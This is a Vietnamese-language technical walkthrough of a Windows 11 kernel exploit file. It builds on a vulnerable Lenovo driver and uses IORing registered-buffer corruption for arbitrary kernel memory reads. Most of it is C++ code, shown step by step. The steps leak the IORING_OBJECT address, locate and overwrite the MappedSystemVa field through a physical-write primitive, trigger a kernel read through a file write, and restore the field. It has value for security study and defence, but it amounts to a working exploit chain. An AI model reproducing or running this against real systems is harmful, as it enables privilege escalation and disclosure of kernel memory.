# 07 — IORing RegBuffers Corruption (Arbitrary Kernel VA Read)

**File:** `07_ioring.cpp`  
**CVE:** CVE-2025-8061 (LnvMSRIO.sys)  
**Platform:** Windows 11 22H2+ (build ≥ 22621)  
**Primitive dùng:** Physical write (1 QWORD) + IORing API  
**Output:** Đọc bất kỳ kernel VA nào qua I/O file channel

---

## Mục tiêu

Chứng minh một technique độc lập: sau khi overwrite một field trong `IORING_OBJECT` kernel struct, IORing subsystem sẽ đọc memory từ bất kỳ kernel VA nào ta chỉ định và ghi vào file — cho phép đọc kernel memory hoàn toàn qua usermode API, không cần physical scan hay page table walk.

---

## Lý thuyết nền

### IORing là gì?

`NtCreateIoRing` (Win11 22H2+) tạo một ring buffer cho phép usermode queue nhiều async I/O operation mà không cần nhiều syscall. Khi `SubmitIoRing` được gọi, kernel xử lý tất cả operations trong queue một lúc.

### Registered Buffers

`BuildIoRingRegisterBuffers` cho phép "pin" một usermode buffer vào physical memory và đăng ký với kernel. Kernel tạo một MDL (Memory Descriptor List), pin pages, và lưu kernel-mode mapping VA vào `IORING_OBJECT.RegBuffers[i].MappedSystemVa`.

Khi `IORING_OP_WRITE_FILE` chạy với `buffer_index = i`, kernel đọc từ `RegBuffers[i].MappedSystemVa` và ghi vào file. **Kernel không validate lại `MappedSystemVa` sau registration.**

### Exploit vector

```
1. Register user buffer → kernel tạo MappedSystemVa = kernel_VA_of_our_buffer
2. Overwrite RegBuffers[0].MappedSystemVa = any_kernel_VA   ← dùng LnvMSRIO write
3. BuildIoRingWriteFile(tempFile, buffer_index=0, len=N)
4. SubmitIoRing → kernel reads N bytes from any_kernel_VA → writes to tempFile
5. ReadFile(tempFile) → ta nhận được N bytes của arbitrary kernel memory
```

---

## Giải thích code từng dòng

### Version check

```cpp
OSVERSIONINFOEXW ovi = { sizeof(ovi) };
auto RtlGetVer = (LONG(NTAPI*)(OSVERSIONINFOEXW*))
    GetProcAddress(GetModuleHandleA("ntdll"), "RtlGetVersion");
RtlGetVer(&ovi);

if (ovi.dwBuildNumber < 22621) {
    printf("[!] IORing registered buffers require Win11 22H2 (build 22621+)\n");
    return 1;
}
```

`RtlGetVersion` bypass compat shim của `GetVersionEx`. `RegisteredBuffers` chỉ có trong `IORING_VERSION_3` (Win11 22H2+).

### Load IoRing APIs dynamically

```cpp
HMODULE kb = LoadLibraryA("KernelBase.dll");

#define LOAD(sym, var) \
    var = (decltype(var))GetProcAddress(kb, sym); \
    if (!var) { printf("[-] %s not found\n", sym); return false; }

LOAD("CreateIoRing",               IoRingCreate)
LOAD("BuildIoRingRegisterBuffers", IoRingRegBufs)
LOAD("SubmitIoRing",               IoRingSubmit)
LOAD("BuildIoRingWriteFile",       IoRingWriteFile)
LOAD("PopIoRingCompletion",        IoRingPop)
LOAD("CloseIoRing",                IoRingClose)
```

IORing APIs nằm trong `KernelBase.dll`. Load dynamic để tránh link error trên older SDK.

### Step 1: Allocate user buffer với sentinel

```cpp
const SIZE_T BUF_SIZE = 0x1000;
const uint64_t SENTINEL = 0xDEADC0DEBEEF1337ULL;

auto *user_buf = (uint8_t*)VirtualAlloc(nullptr, BUF_SIZE,
                                         MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);

// Fill toàn bộ với pattern dễ nhận biết
for (SIZE_T i = 0; i + 8 <= BUF_SIZE; i += 8)
    *(uint64_t*)(user_buf + i) = SENTINEL;
```

Fill sentinel để sau này verify: `KernelRead(MappedSystemVa)` phải trả về pattern này → chứng minh ta đã locate đúng `MappedSystemVa`.

### Step 2: Tạo IoRing

```cpp
HIORING ring = nullptr;
IORING_CREATE_FLAGS cf = { IORING_CREATE_ADVISORY_FLAGS_NONE,
                            IORING_CREATE_REQUIRED_FLAGS_NONE };
HRESULT hr = IoRingCreate(IORING_VERSION_3, cf,
                           64,    // SQ queue size
                           64,    // CQ queue size
                           &ring);
```

### Step 3: Register buffer

```cpp
IORING_BUFFER_INFO buf_info = { user_buf, BUF_SIZE };
hr = IoRingRegBufs(ring, 1, &buf_info, 0);  // đăng ký 1 buffer

UINT32 submitted = 0;
hr = IoRingSubmit(ring, 1, INFINITE, &submitted);
// Submit registration operation → kernel xử lý → tạo MDL, pin pages, set MappedSystemVa
```

Sau `SubmitIoRing` này, kernel đã:
1. Tạo MDL cho `user_buf`
2. Pin physical pages của buffer
3. Tạo kernel mapping VA
4. Lưu vào `IORING_OBJECT.RegBuffers[0].MappedSystemVa`

### Step 4: Tìm IORING_OBJECT VA

```cpp
// NtQuerySystemInformation(0x10 = SystemHandleInformation)
// trả về tất cả kernel object pointers cho mọi handle
uint64_t ioring_va = HandleToObjectVa(hKernel);
```

```cpp
static uint64_t HandleToObjectVa(HANDLE h)
{
    // Allocate buffer, gọi NtQSI với class 0x10
    auto *info = (SYS_HANDLE_INFO*)buf;
    DWORD my_pid = GetCurrentProcessId();
    USHORT hval  = (USHORT)(ULONG_PTR)h;  // handle value
    
    for (ULONG i = 0; i < info->Count; i++) {
        if (info->Entries[i].Pid == (USHORT)my_pid &&   // filter by PID
            info->Entries[i].Handle == hval) {           // filter by handle value
            return (uint64_t)(uintptr_t)info->Entries[i].Object;  // kernel object VA
```

`SYS_HANDLE_ENTRY.Object` là kernel VA của IORING_OBJECT. Không cần physical scan — `NtQuerySystemInformation` leak nó trực tiếp cho ta.

### Step 5-6: Scan IORING_OBJECT để tìm RegBuffers entry

```cpp
static bool FindRegBufEntry(uint64_t cr3, uint64_t ioring_va,
                             SIZE_T buf_size, RegBufInfo *out)
{
    uint8_t obj_dump[0x200] = {};
    KernelRead(cr3, ioring_va, obj_dump, sizeof(obj_dump));  // đọc 512 bytes của IORING_OBJECT

    // Scan từng 8-byte aligned slot
    for (int off = 0; off + 8 <= (int)sizeof(obj_dump); off += 8) {
        uint64_t cand = *(uint64_t*)(obj_dump + off);
        if ((cand >> 48) != 0xFFFF) continue;  // phải là kernel VA
        if (cand & 0x7) continue;              // phải align 8 bytes
```

```cpp
        // Try 1: cand là trực tiếp con trỏ đến NT_IORING_BUFFER_REG
        // NT_IORING_BUFFER_REG layout:
        //   +0x00 LIST_ENTRY (16 bytes)
        //   +0x10 MappedSystemVa (8 bytes) ← đây là thứ ta cần overwrite
        //   +0x18 Length (8 bytes)
        //   +0x20 Mdl (8 bytes)
        
        uint64_t mv = 0, len = 0;
        KernelRead(cr3, cand + 0x10, &mv, 8);   // đọc MappedSystemVa
        KernelRead(cr3, cand + 0x18, &len, 8);  // đọc Length

        if ((mv >> 48) == 0xFFFF && len == (uint64_t)buf_size) {
            // mv phải là kernel VA, len phải match buffer size ta đã đăng ký
            out->entry_va     = cand;
            out->mapped_va    = mv;
            out->mapped_va_pa = VaToPa(cr3, cand + 0x10);  // PA của MappedSystemVa field
            out->length       = len;
            return true;
        }
```

```cpp
        // Try 2: cand là pointer-to-array (RegBuffers = Ptr64 → Ptr64[])
        uint64_t entry_ptr = 0;
        KernelRead(cr3, cand, &entry_ptr, 8);  // dereferencing
        if ((entry_ptr >> 48) != 0xFFFF || (entry_ptr & 7)) continue;
        
        KernelRead(cr3, entry_ptr + 0x10, &mv2, 8);
        KernelRead(cr3, entry_ptr + 0x18, &len2, 8);
        
        if ((mv2 >> 48) == 0xFFFF && len2 == (uint64_t)buf_size) {
            // Found via double-dereference
```

Hai pattern tìm RegBuffers entry: direct pointer hoặc pointer-to-pointer. Cần cả hai vì IORING_OBJECT layout không documented và có thể khác nhau giữa build.

### Step 7: Verify

```cpp
static bool VerifyMappedVa(uint64_t cr3, uint64_t mapped_va,
                            const uint8_t *user_buf, DWORD check_len)
{
    uint8_t kern_buf[64] = {};
    KernelRead(cr3, mapped_va, kern_buf, check_len);
    return memcmp(kern_buf, user_buf, check_len) == 0;
    // Nếu match → mapped_va thực sự trỏ đến user buffer của ta (được kernel map)
}
```

### Step 10: Overwrite MappedSystemVa

```cpp
// Ghi PA của MappedSystemVa field, không phải VA
// Vì ta có mapped_va_pa = VaToPa(cr3, entry_va + 0x10)

PhysWriteU64(entry.mapped_va_pa, nt_base);
// nt_base = ntoskrnl.exe kernel VA base

// Verify write
uint64_t rb = 0;
PhysReadU64(entry.mapped_va_pa, &rb);
// Expected: rb == nt_base
```

Bây giờ `RegBuffers[0].MappedSystemVa = ntoskrnl_base`. Khi IORing write file, kernel sẽ đọc từ ntoskrnl_base (MZ header) thay vì user buffer.

### Step 11: Trigger read via IORing write

```cpp
IORING_HANDLE_REF fref = { IORING_HANDLE_REF_RAW, { hFile } };
IORING_BUFFER_REF bref = {};
bref.Kind = IORING_REF_REGISTERED;
bref.Registered.BufferIndex = 0;  // dùng buffer đã đăng ký (nhưng đã bị overwrite MappedVa)
bref.Registered.Offset = 0;

// Yêu cầu: ghi 4 bytes từ buffer[0] vào file tại offset 0
hr = IoRingWriteFile(ring, fref, bref, 4, 0,
                     FILE_WRITE_FLAGS_NONE, 0xCAFE, IORING_SQE_FLAGS_NONE);

UINT32 sub2 = 0;
hr = IoRingSubmit(ring, 1, 5000, &sub2);
// Kernel: đọc 4 bytes từ RegBuffers[0].MappedSystemVa = ntoskrnl_base
//         ghi vào hFile
```

### Step 12: Đọc kết quả

```cpp
SetFilePointer(hFile, 0, nullptr, FILE_BEGIN);
uint8_t file_bytes[4] = {};
DWORD got = 0;
ReadFile(hFile, file_bytes, 4, &got, nullptr);

// Expected: file_bytes = {0x4D, 0x5A, ...} = "MZ" = ntoskrnl header!
bool success = (got == 4) && (file_bytes[0] == 'M') && (file_bytes[1] == 'Z');
```

`MZ` trong file = proof rằng kernel đọc 4 bytes từ ntoskrnl.exe base VA và wrote vào file.

### Step 13: Restore

```cpp
printf("[*] Restoring RegBuffers[0].MappedSystemVa...\n");
PhysWriteU64(entry.mapped_va_pa, entry.mapped_va);
// Restore về giá trị gốc (VA của user buffer kernel mapping)
```

---

## Tại sao technique này quan trọng?

Nếu attacker có **bất kỳ primitive nào write 1 QWORD vào kernel** (UAF, pool overflow, arbitrary write qua bug khác), họ có thể dùng IORing để đọc arbitrary kernel memory mà **không cần driver thứ hai**, không cần page table walk phức tạp. Chỉ cần:
1. Tìm `MappedSystemVa` field (offset không cố định nhưng scan được)
2. Overwrite nó
3. Dùng `WriteFile` qua IORing → data ra file → đọc từ usermode

---

## Stability

| Vấn đề | Giải thích |
|--------|-----------|
| Win11 22H2+ only | API không có trên Win10 / Win11 21H2 |
| IORING_OBJECT offset scan | Không hardcode offset → robust hơn, nhưng scan có thể fail trên future builds |
| MappedSystemVa size check | Length phải match buffer size đã register — nếu sai, kernel có thể crash |
| PID > 65535 | `SYS_HANDLE_ENTRY.Pid` là USHORT → PIDs lớn hơn 65535 sẽ overflow. Rare nhưng có thể |
| MMIO skip | Đã add `if (pa >= 0xC0000000 && pa < 0x100000000) continue` trong GetSystemCR3 |

---

## Tóm tắt flow

```
VirtualAlloc(BUF_SIZE) → user_buf (filled với SENTINEL)
    ↓
CreateIoRing(v3) → ring, hKernel
BuildIoRingRegisterBuffers(user_buf) → SubmitIoRing
    ↓ kernel: MDL pin → MappedSystemVa = kernel_mapping_of_user_buf
    ↓
HandleToObjectVa(hKernel) → ioring_va
GetSystemCR3() → cr3
    ↓
KernelRead(ioring_va, 0x200 bytes)
Scan → find entry where MappedVa = kernel VA and Length = BUF_SIZE
→ entry.mapped_va_pa = PA của MappedSystemVa field
    ↓
PhysWriteU64(entry.mapped_va_pa, ntoskrnl_base)
    ↓
BuildIoRingWriteFile(file, bufIdx=0, len=4) → SubmitIoRing
    kernel reads 4 bytes from ntoskrnl_base → writes to file
    ↓
ReadFile → {4D 5A ...} = "MZ" ✓ (ntoskrnl header!)
    ↓
PhysWriteU64(entry.mapped_va_pa, original_mapped_va)  ← RESTORE
```
